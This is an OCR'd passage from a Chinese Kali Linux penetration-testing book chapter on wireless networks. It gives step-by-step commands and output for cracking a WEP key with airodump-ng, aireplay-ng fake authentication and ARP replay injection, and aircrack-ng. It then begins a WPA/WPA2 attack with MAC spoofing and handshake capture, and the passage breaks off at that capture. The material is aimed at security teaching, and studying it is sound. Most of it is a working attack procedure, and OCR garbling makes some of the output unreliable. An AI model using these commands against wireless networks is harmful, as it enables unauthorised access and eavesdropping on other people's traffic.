该列表中前面的编号，表示的是设备的索引号。用户可以通过指定索引号，停止或启
用某个设备。如启用所有设备，执行如下所示的命令：
root@kali:~# rfkill unblock all
执行以上命令后，没有任何信息输出。以上命令表示，解除所有被关闭的设备。
（4）使用airodump命令定位附近所有可用的无线网络。执行命令如下所示：
root@kali:~# airodump-ng wlan0
CH 2 ][ Elapsed: 1 min ][ 2014-05-15 17:21
BSSID
PWR Beacons #Data,#/s CHMB
ENC CIPHER AUTH
ESSID
14:E6:E4:AC:FB:20
-30
40
13
0
1
54e.
WEP
WEP
Test
8C:21:0A:44:09:F8
-41
24
2
0
6
54e.
WPA2
CCMP PSK
z
14:E6:E4:84:23:7A
-44
17
1
0
1
54e.
WPA2
CCMP PSK
C8:64:C7:2F:A1:34
-64
19
0
1
54.
OPN
CMCC
1C:FA:68:D7:11:8A
9-
37
0
0
1
54e.
WPA2
CCMP
PSK
TP-LI
EA:64:C7:2F:A1:34
9-
18
0
0
1
54.
WPA2
CCMP MGT
CMCC-
DA:64:C7:2F:A1:34
9-
18
0
0
1
54.
OPN
CMCC-
4A:46:08:C3:99:DC
99-
7
0
0
1
54.
OPN
CMCC-
E0:05:C5:E7:68:84
-67
17
0
0
1
54.
WPA2
CCMP PSK
TP-LI
5A:46:08:C3:99:DC
-67
10
0
0
1
54.
WPA2
CCMP
MGT
CMCC-
CC:34:29:5A:8E:B0
-68
26
0
0
6
54e.
WPA2
CCMP
PSK
TP-LI
5A:46:08:C3:99:D9
89-
9
0
0
11
54.
WPA2
CCMP
MGT
CMCC-
5A:46:08:C3:99:D3
-68
16
0
0
6
54.
WPA2
CCMP MGT
<leng
38:46:08:C3:99:D9
-68
9
0
O
11
54.
OPN
CMCC
9C:21:6A:E8:89:E0
-68
27
0
0
11
54e.
WPA2
CCMP
PSK
TP-LI
EA:64:C7:2F:A0:FF
89-
7
0
Q
1154.WPA2
CCMPMGT
CMCC-
以上输出的信息显示了附近所有可用的无线网络。当我到用户想要攻击的无线路由器
时，按下Ctrl+C键停止搜索。
从输出的信息中看到有很多参数。详细介绍如下所示。
口BSSID：无线的IP地址。
口PWR：网卡报告的信号水平。
口Beacons：无线发出的通告编号。
口#Data：被捕获到的数据分组的数量，包括广播分组。
口#/s：过去10秒钟内每秒捕获数据分组的数量。
口CH：信道号（从Beacons中获取）。
口MB：无线所支持的最大速率。如果MB=11，它是802.11b：如果MB=22，它是
802.11b+：如果更高就是802.11g。后面的点（高于54之后）表明支持短前导码。
口ENC：使用的加密算法体系。OPN表示无加密。WEP？表示WEP或者WPA/WPA2
模式，WEP（没有问号）表示静态或动态WEP。如果出现TKIP或CCMP，那么
就是WPA/WPA2。
口CIPHER：检测到的加密算法，是CCMP、WRAAP、TKIP、WEP和WEP104中
的一个。典型的来说（不一定），TKIP与WPA结合使用，CCMP与WPA2结合
使用。如果密钥索引值大于0，显示为WEP40。标准情况下，索引0-3是40bit，
104bit应该是0。
· 275 ·
---
## Page 288
第3篇各种渗透测试
口AUTH：使用的认证协议。常用的有MGT（WPA/WPA2使用独立的认证服务器，
平时我们常说的802.1x、radius和eap等）、SKA（WEP的共享密钥）、PSK
（WPA/WPA2的预共享密钥）或者OPN（WEP开放式）。
口ESSID：指所谓的SSID号。如果启用隐藏的SSID的话，它可以为空。这种情况
下，airodump-ng试图从proberesponses 和associationrequests中获取SSID。
口STATION：客户端的MAC地址，包括连上的和想要搜索无线来连接的客户端。
口Rate：表示传输率。
口Lost：在过去10秒钟内丢失的数据分组，基于序列号检测。它意味着从客户端来
的数据丢包，每个非管理帧中都有一个序列号字段，把刚接收到的那个帧中的序
列号和前一个帧中的序列号一减就能知道丢了几个包。
口Frames：客户端发送的数据分组数量。
口Probe：被客户端查探的ESSID。如果客户端正试图连接一个无线，但是没有连接
上，那么就显示在这里。
（5）使用airodump-ng捕获指定BSSID的文件。执行命令如下所示。
airodump-ng命令常用的选项如下所示。
口-C：指定选择的频道。
口-W：指定一个文件名，用于保存捕获的数据。
口-bssid：指定攻击的BSSID。
下面将Bssid为14:E6:E4:AC:FB：20的无线路由器作为攻击目标。执行命令如下所示：
root@kali:~# airodump-ng -c 1 w wirelessattack --bssid 14:E6:E4:AC:FB:20 mon0
CH 1 ][ Elapsed: 9 mins ][ 2014-05-15 17:31
BSSID
PWR RXQBeacons #Data, #/s CHMBENC CIPHER AUTH ESSID
BSSID
STATION
PWR
RateLostFramesProbe
14:E6:E4:AC:FB:20
00:11:22:33:44:550
0-1117
88836
14:E6:E4:AC:FB:20
18:DC:56:F0:62:AF-24
54 -54e 654
312
从输出的信息中可以看到ESSID为Test无线路由器的#Data一直在变化，表示有客户
端正与无线发生数据交换。以上命令执行成功后，会生成一个名为wirelessattack-01.ivs的
文件，而不是wirelessattack.ivs。这是因为airodump-ng工具为了方便后面破解的时候调用，
所有对保存文件按顺序编了号，于是就多了-01这样的序号，以此类推。在进行第二次攻
击时，若使用同样文件名wirelessattack保存的话，就会生成名为wirelessattack-02.ivs文件。
（6）打开一个新的终端窗口，运行aireplay命令。aireplay命令的语法格式如下所示：
aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address]-e [ESSID] [Interface]
启动aireplay，执行命令如下所示：
root@kali:~# aireplay-ng -1 0 -a 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 -e Test mon0
· 276 ·
---
## Page 289
第9章无线网络渗透测试
The interface MAC (00:C1:40:76:05:6C) doesn't match the specified MAC (-h).
ifconfig mon0 hw ether 00:11:22:33:44:55
17:25:17Waiting for beacon frame (BSSID: 14:E6:E4:AC:FB:20) on channel 1
17:25:17
Sending Authentication Request(Open System) [ACK]
17:25:17
Switching to shared key authentication
17:25:19 Sending Authentication Request (Shared Key) [ACK]
17:25:19Switching to shared key authentication
17:25:21
Sending Authentication Request (Shared Key) [ACK]
17:25:21
Switching to shared key authentication
17:25:23
Sending Authentication Request (Shared Key) [ACK]
17:25:23
Switching to shared key authentication
17:25:25
Sending Authentication Request (Shared Key) [ACK]
17:25:25
Switching to shared key authentication
17:25:27
Sending Authentication Request (Shared Key) [ACK]
17:25:27
Switching to shared key authentication
17:25:29
Sending Authentication Request (Shared Key) [ACK]
17:25:29Switching to sharedkey authentication
（7）使用aireplay发送一些流量给无线路由器，以至于能够捕获到数据。语法格式如
下所示：
执行命令如下所示：
root@kali:~#aireplay-ng -3-b 14:E6:E4:AC:FB:20-h 00:11:22:33:44:55 mon0
The interface MAC (00:C1:40:76:05:6C) doesn't match the specified MAC (-h).
ifconfig mon0 hw ether 00:11:22:33:44:55
17:26:54Waiting for beacon frame (BSSID:14:E6:E4:AC:FB:20)on channel 1
Notice: got a deauth/disassoc packet. Is the source MAC associated ?
Read 1259 packets (got 1 ARP requests and 189 ACKs), sent 198 packets...499 pps
Read 1547 packets (got 1 ARP requests and 235 ACKs), sent 248 packets...(499 pps
Read 2446 packets (got 1 ARP requests and 381 ACKs), sent 398 packets...(499 pps
Read 2753 packets (got 1 ARP requests and 430 ACKs), sent 449 packets...(500 pps
Read 3058 packets (got 1 ARP requests and 476 ACKs), sent 499 packets...(500 pps
Read 3367 packets (got 1 ARP requests and 525 ACKs), sent 548 packets...499 pps
Read 3687 packets (got 1 ARP requests and 576 ACKs), sent 598 packets..499 pps
Read 4001 packets (got 1 ARP requests and 626 ACKs), sent 649 packets...(500 pps
Read 4312 packets (got 1 ARP requests and 674 ACKs), sent 699 packets...(500 pps
Read 4929 packets (got 1 ARP requests and 768 ACKs), sent 798 packets..499 pps
Read 5239 packets (got 1 ARP requests and 817 ACKs), sent 848 packets.(499 pps
输出的信息就是使用ARPRequests的方式来读取ARP请求报文的过程，此时回到
airodump-ng界面查看，可以看到Test的Frames栏的数字在飞速的递增。在抓取的无线数
据报文达到了一定数量后，一般都是指IVsX值达到2万以上时，就可以开始破解，若不
能成功就等待数据包文继续抓取，然后多尝试几次。
（8）使用Aircrack破解密码。执行命令如下所示：
root@kali:~# aircrack-ng -b 14:E6:E4:AC:FB:20 wirelessattack-01.cap
Opening wirelessattack-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 7197 ivs.
Aircrack-ng 1.2 beta1
·277 ·
---
## Page 290
第3篇各种渗透测试
[00:00:54] Tested 15761 keys (got 10002 IVs)
KB
depthbyte(vote)
0/4
1
1/5
62(15360) 66(14336) 3C(14080) 76(14080) 5E(13568) 23(13312) 25(13312)
2
2/13
63(14336) 11(14336) 7A(13824) AA(13824) A9(13568) 5D(13568) 7E(13312)
3
3/7
4
9/1065(13824)36(13568)42(13568)8B(13568)BF(13568) 29(13312)7F(13312)
KEY FOUND![61:62:63:64:65](ASCIl: abcde)
Decrypted correctly: 100%
从输出的结果中可以看到KEYFOUND，表示密码已经找到，为abcde。
9.2.2破解WPA/VWPA2无线网络
WPA全名为Wi-FiProtectedAccess，有WPA和WPA2两个标准。它是一种保护无线
电脑网络安全的协议。对于启用WPA/WPA2加密的无线网络，其攻击和破解步骤及攻击
是完全一样的。不同的是，在使用airodump-ng进行无线探测的界面上，会提示为WPA
CCMPPSK。当使用aireplay-ng进行攻击后，同样获取到WPA握手数据包及提示：在破
解时需要提供一个密码字典。下面将介绍破解WPA/WPA2无线网络的方法。
使用aircrack-ng破解WPA/WPA2无线网络的具体操作步骤如下所示。
（1）查看无线网络接口。执行命令如下所示：
kali:~# airmon-ng
Interface
Chipset
Driver
wlano
Ralink RT2870/3070
rt2800usb - [phy1]
（2）停止无线网络接口。执行命令如下所示：
root@kali:~# airmon-ng stop wlan0
#停止wlan0接口
Interface
Chipset
Driver
wlano
Ralink RT2870/3070
rt2800usb-[phy1]
(monitor mode disabled)
（3）修改无线网卡MAC地址。执行命令如下所示：
root@kali:~# macchanger --mac 00:11:22:33:44:55 wlan0
Permanent MAC: 00:c1:40:76:05:6c (unknown)
Current
MAC: 00:c1:40:76:05:6c (unknown)
New
MAC: 00:11:22:33:44:55 (Cimsys Inc)
（4）启用无线网络接口。执行命令如下所示：
root@kali:~# airmon-ng start wlan0
Found 3 processes that could cause trouble
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e
PID Name
2567 NetworkManager
2716 dhclient
15609
wpa_supplicant
Interface
Chipset
Driver
wlano
Ralink RT2870/3070 rt2800usb - [phy1]
(monitor mode enabled on mon0)
（5）捕获数据包。执行命令如下所示：
· 278 ·
---
## Page 291
第9章无线网络渗透测试
root@kali:~# airodump-ng -c 1 -w abc --bssid 14:E6:E4:AC:FB:20 mon0
CH1 ][ Elapsed: 3 mins ][ 2014-05-15 17:53 ][ WPA handshake: 14:E6:E4:AC:FB:20